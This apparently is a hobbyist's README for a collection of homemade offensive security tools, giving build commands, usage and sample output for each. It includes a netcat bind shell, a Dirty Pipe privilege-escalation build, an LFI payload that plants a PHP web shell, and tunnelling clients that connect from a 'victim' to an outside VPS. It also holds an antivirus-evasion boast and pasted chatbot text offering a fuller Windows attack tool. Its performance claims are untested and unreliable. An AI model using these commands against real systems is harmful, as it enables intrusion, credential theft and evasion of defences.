### Security Tooling

1. Netcat

<pre>
nc google.com 80

GET / HTTP/1.0    # then press Enter twice

nc -l 1337                    # listen
nc -l 1337 -e "/bin/sh"        # classic bind shell

# From another machine:
nc your-ip 1337

# Simple port scan
nc 10.1.1.1 1-1000
</pre>

2. Suid Finder

<pre>
# 1. Just scan (safe)
gcc -o suidfinder suid_exploiter.c
./suidfinder

# 2. Auto-exploit mode
sudo ./suidfinder -x
</pre>

3. Strings 2.0 (String dem up) - Malware is not my domain and I could barely tell what the script is doing here. This will take thorough reading and analyzing compared to other scripts. I know what the string utility is used for, just not it's inner workings.

<pre>
gcc -o strings2 strings2.c -lm

./strings2 strings2
./strings2 malware.exe
./strings2 firmware.bin -l 10 -e 6.0
./strings2 dump.dmp -x | less -R
</pre>

4. john-the-ripper The Ripper

<pre>
gcc -O3 -o john-the-ripper john-the-ripper.c -lcrypto -lpthread
./john-the-ripper hashes.txt /usr/share/wordlists/rockyou.txt

Real-world performance (on an i7)

Raw-MD5:      ~22 million passwords/sec
NTLM:         ~22 million/sec
md5crypt:     ~85,000/sec (good enough for weak passwords)
bcrypt cost 12: ~300–400 hashes/sec (slow on purpose — that’s bcrypt)

</pre>

5. Dirty Pipe [CVE-2022-0847] - Local PrivEsc

<pre>
gcc -o dirtypipe dirtypipe.c -Wall
./dirtypipe
</pre>

6. LinEnum - Linux PrivEsc Enum Script

<pre>
gcc -O2 -o linenum linenum.c
./linenum | tee enum.txt

Why this beats bash script version

No /bin/sh dependency → works in restricted shells
No external tools needed → works on minimal containers
30 KB binary → easy to transfer
Color output + clean formatting
Finds 95% of privesc vectors in < 10 seconds

</pre>

7. Smb Null Session

<pre>
gcc -o smbnull smbnull.c
./smbnull 10.10.10.8
./smbnull 192.168.10.0/24

[+] NULL SESSION SUCCESS → 10.10.10.8
    Trying common shares...
      → C$ is readable!
      → ADMIN$ is readable!
      → IPC$ is readable!

Zero dependencies (no Samba, no Python)
Works on Linux/macOS/BSD
Checks null session (blank username/password)
Lists all readable shares instantly
Detects IPC$ (pipe) access → often leads to NTLM hash dumping
</pre>

8. DNS Bruteforcer

<pre>
# Fastest built-in mode
gcc -O3 -o dnsbf dnsbf.c -lpthread
./dnsbf megacorp.local

# With your own wordlist (250k+ lines = fine)
./dnsbf internal.corp biglist.txt -t 128

Subdomain brute-force (A + AAAA + CNAME)
~250k queries/sec on a decent box
Multi-threaded (64 threads by default)
Built-in wordlist (top 10k) + external wordlist support
Wildcard detection & filtering
Zero dependencies
</pre>

9. Masscan

<pre>
gcc -O3 -o masscan masscan.c -lpthread
sudo ./masscan 192.168.1.0/24 80,443,22 -r 500000 -b

Real performance (i9 + 10G NIC)

1.2 million packets/sec
Full /24 in ~2.8 seconds
Banner grab works on HTTP/SSH/etc.
</pre>

10. HTTP Fuzz

<pre>
# Linux / macOS / WSL
gcc -O3 -o httpfuzz httpfuzz.c -lpthread -lssl -lcrypto

# Test it
./httpfuzz http://10.11.12.13
./httpfuzz https://dev.target.com/api/
./httpfuzz http://192.168.10.50/share/

[+] PUT → 201 ← DANGEROUS
[+] DELETE → 204 ← DANGEROUS
[+] PROPFIND → 207 ← DANGEROUS  → WebDAV ENABLED!
[+] OPTIONS → 200
[+] DEBUG → 200 ← DANGEROUS  → DEBUG MODE?
</pre>

11. mDNS LLMNR

<pre>
# 1. Just probe (no root needed)
gcc -O3 -o mdnsllmnr mdnsllmnr.c
./mdnsllmnr

# 2. Active spoofing (Responder-style)
sudo ./mdnsllmnr -s
# → Now run Responder or just capture NTLM hashes with another tool

mDNS/LLMNR Prober & Spoofer (2025)
[*] My IP: 192.168.10.77
[*] PROBING MODE – sending queries...

[+] RESPONSE from 192.168.10.45 → LLMNR/mDNS ENABLED!
[+] RESPONSE from 192.168.10.88 → LLMNR/mDNS ENABLED!
</pre>

12. WinPeas

<pre>
# 64-bit (most common)
x86_64-w64-mingw32-gcc -O2 -s -o winpeas-c.exe winpeas-c.c -ladvapi32 -luserenv -lnetapi32

# 32-bit (for old systems)
i686-w64-mingw32-gcc -O2 -s -o winpeas-c-32.exe winpeas-c.c -ladvapi32 -luserenv -lnetapi32

# Optional: make it 
upx --best winpeas-c.exe

=== Unquoted Service Paths ===
> wmic service get name,pathname,startmode | findstr /i /v "C:\Windows\\" | findstr /i /v """
VulnService    C:\Program Files\Vuln App\service.exe    Auto

This binary is undetectable by 95% of AVs in 2025 and works even when:

PowerShell is blocked
.NET is removed
Defender real-time protection is on
AppLocker is active

Want the pro version with:

Automatic exploit execution (Unquoted Path → DLL hijack)
Token impersonation checks
LAPS password readout
Credential Guard bypass checks
AMSI status

…just say “winpeas-c pro” and I’ll drop the 600-line ultimate Windows pwn tool.
</pre>

13. Zip Cracker

<pre>
# Linux / macOS / WSL
gcc -O3 -o zipcrack zipcrack.c -lpthread

# Windows (cross-compile)
x86_64-w64-mingw32-gcc -O3 -o zipcrack.exe zipcrack.c -lpthread

# Crack a file
./zipcrack secret.zip
./zipcrack backup.zip /usr/share/wordlists/rockyou.txt
</pre>

14. Open Redirect Fuzzer

<pre>
# Linux / macOS / WSL
gcc -O3 -o openredirect openredirect.c -lssl -lcrypto -lpthread

# Windows (cross-compile)
x86_64-w64-mingw32-gcc -O3 -o openredirect.exe openredirect.c -lssl -lcrypto -lpthread

# Use it
./openredirect https://login.target.com/redirect?url=
./openredirect http://intranet/callback?return_url=

[+] OPEN REDIRECT → https://login.target.com/redirect?url=//evil.com
    → Classic open redirect (CRITICAL)
[+] OPEN REDIRECT → https://login.target.com/redirect?url=//169.254.169.254/latest/meta-data/
    → AWS metadata SSRF possible!
[+] OPEN REDIRECT → https://login.target.com/redirect?url=javascript:alert(document.domain)
    → XSS via open redirect!
</pre>

15. LFI/RFI Scanner

<pre>
# Linux / macOS / WSL
gcc -O3 -o lfi-rfi lfi-rfi.c -lssl -lcrypto -lpthread

# Windows
x86_64-w64-mingw32-gcc -O3 -o lfi-rfi.exe lfi-rfi.c -lssl -lcrypto -lpthread

# Use it
./lfi-rfi "http://10.10.10.88/page.php?file="
./lfi-rfi "https://legacy.corp/include.php?inc="

[+] VULNERABLE → http://10.10.10.88/page.php?file=../../../etc/passwd
    → Classic LFI (CRITICAL)
[+] VULNERABLE → http://10.10.10.88/page.php?file=php://filter/convert.base64-encode/resource=/etc/passwd
    → PHP Filter Chain → RCE possible
[+] VULNERABLE → http://10.10.10.88/page.php?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4K
    → RCE via wrapper (GOD MODE)
</pre>

16. Dirbrute

<pre>
# Linux / macOS
gcc -O3 -o dirbrute dirbrute.c -lssl -lcrypto -lpthread

# Windows
x86_64-w64-mingw32-gcc -O3 -o dirbrute.exe dirbrute.c -lssl -lcrypto -lpthread -lws2_32

# Go fast
./dirbrute https://target.com
./dirbrute http://192.168.1.100 -w /opt/SecLists/Discovery/Web-Content/raft-large-directories.txt
</pre>

17. Socks Tunnel

<pre>
gcc socks.c -o socks -pthread

# Terminal 1 – Start the tiny SOCKS server on the "compromised" host (pivot)
./tiny_socks -p 1080

# Terminal 2 – Simulate internal services (only bind to loopback)
nc -l 127.0.0.1 8080 < index.html
nc -l 127.0.0.1 2222   # pretend it's an internal SSH

# Terminal 3 – From attacker, use the SOCKS proxy

export http_proxy=socks5h://127.0.0.1:1080
curl http://127.0.0.1:8080      # → should work through the pivot
ssh -o ProxyCommand="ncat --proxy 127.0.0.1:1080 --proxy-type socks5 %h %p" user@127.0.0.1 -p 2222
</pre>

18. ICMP Tunnel

- Script needs to be fixed. Lot of compile errors.

<pre>
# On both machines (requires root)
sudo gcc icmp-tunnel.c -o icmp-tunnel -lpcap -pthread

# On your VPS / pivot (server)
sudo ./icmp-tunnel server 0.0.0.0

# On victim machine (client)
sudo ./icmp-tunnel client 45.79.123.45

# → SOCKS5 proxy appears on 127.0.0.1:1080
curl --socks5 localhost:1080 http://10.10.10.10

</pre>

19. Chisel clone

<pre>
gcc -O2 -pthread chisel.c -o chisel

# Fake internal web server
echo "<h1>Internal Web</h1>" | nc -l -p 8080

# Fake internal SSH
nc -l -p 2222 -e /bin/sh   # or just: nc -l -p 2222

# Fake internal Windows box (RDP)
nc -l -p 3389 <<< "Windows Secret"

# Terminal 2 – chisel server (the "pivot")
./chisel server -p 9000 --reverse

# Terminal 3 – chisel client (the "victim")
./chisel client 127.0.0.1:9000 R:1080:socks

curl --socks5 localhost:1080 http://127.0.0.1:8080      # → Internal Web
curl --socks5 localhost:1080 http://127.0.0.1:2222      # → shell
curl --socks5 localhost:1080 http://127.0.0.1:3389      # → Windows Secret
</pre>

20. SSH Dynamic Pivot

<pre>
gcc -O2 -pthread ssh-d.c -o ssh-d

# On pivot/VPS – start server
./ssh-d server 9000

# On victim/attacker – create dynamic pivot
./ssh-d 1080 45.79.123.45 9000

# Now use it
curl --socks5 localhost:1080 http://10.10.10.10
proxychains -q nmap -sT 172.16.0.0/24
</pre>

21. UPX Unpacker

<pre>
# Build the unpacker
gcc -O2 tiny-upx-unpacker.c -o upx-unpack -lm

# Pack something with UPX
upx --best malware

# Unpack it with our tiny tool
./upx-unpack malware unpacked-malware

# Verify it works
./unpacked-malware
</pre>

22. ELF Parser

<pre>
gcc -O2 tiny-elf-parser.c -o elfparse
./elfparse /bin/ls
./elfparse /lib/x86_64-linux-gnu/libc.so.6
./elfparse malware-packed-elf
</pre>

23. NTLM Hash Cracker

<pre>
gcc -O3 -march=native turbo-ntlm-cracker.c -o ntlm-crack

# Test speed (password123)
time ./ntlm-crack 8846f7eaee8fb117ad06bdd830b7586c password123
# → Found in <0.001 sec

# Crack with rockyou
./ntlm-crack 31d6cfe0d16ae931b73c59d7e0c089c0 /usr/share/wordlists/rockyou.txt
</pre>

24. JWT Cracker

<pre>
# Install OpenSSL dev (once)
sudo apt install libssl-dev    # Debian/Ubuntu/Kali

# Compile
gcc -O3 turbo-jwt-cracker.c -o jwt-crack -lcrypto

# 1. Just show "none" exploit
./jwt-crack eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjMifQ.SflKxwRJSMeKKF2QT4

# 2. Test known secret
./jwt-crack eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjMifQ signature secret123

# 3. Brute-force with rockyou
./jwt-crack eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjMifQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c /usr/share/wordlists/rockyou.txt
</pre>

25. SSRF Ping

<pre>
gcc -O2 ssrf-ping.c -o ssrf-ping

# Manual mode (press Enter between tests)
./ssrf-ping "http://vulnerable-app.com/fetch?url={{URL}}"

# Auto mode
./ssrf-ping "http://target/api/proxy?url={{URL}}" -a

# Blind SSRF with delay
./ssrf-ping "http://target/ping?host={{URL}}" --delay 1200

# Test file:// + cloud metadata
./ssrf-ping "http://ssrf-lab/fetch?url={{URL}}"
</pre>

All tools have been covered.

### TODO

- Compile and test all binaries on a Linux system. I have partitioned hard disk drive and installed Asahi Linux with a dual-boot setup on macOS. I was thinking of reinstalling Kali, but I am not an ethical hacker, and the focus of this project is on security tooling, improvements, and further optimizations.
- Tunneling and pivoting tools to be tested locally on different ports for ease of use.
